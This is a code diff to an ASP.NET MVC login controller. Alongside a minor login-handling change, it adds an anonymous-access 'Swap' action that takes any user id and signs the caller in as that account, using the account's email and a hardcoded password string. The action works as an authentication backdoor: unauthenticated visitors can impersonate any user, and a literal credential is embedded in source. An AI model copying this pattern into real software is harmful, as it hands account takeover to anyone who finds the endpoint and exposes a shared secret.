@@ -7,6 +7,7 @@ using System.Web.Mvc;
 using bat.logic.Constants;
 using Elmah;
 using Microsoft.AspNet.Identity;
+using bat.data;
 
 namespace bat.Controllers
 {
@@ -94,6 +95,27 @@ namespace bat.Controllers
             {
                 var auth = new logic.Models.System.Authentication(Request.GetOwinContext());
                 auth.Login(auth.GetUser(txtUsername, txtPassword));
+            }
+            catch (Exception ex)
+            {
+                ErrorSignal.FromCurrentContext().Raise(ex);
+                ViewBag.LoginErrMsg = ex.Message;
+                return View();
+            }
+
+            return RedirectToRoute("home");
+        }
+
+        [AllowAnonymous]
+        public ActionResult Swap(int id)
+        {
+            var model = new bat.logic.Rules.Swap();
+            
+            try
+            {
+                model.User(id);
+                var auth = new logic.Models.System.Authentication(Request.GetOwinContext());
+                auth.Login(auth.GetUser(model.account.Email, "VJ6ayJaWwtZ7S3m"));
             }
             catch (Exception ex)
             {
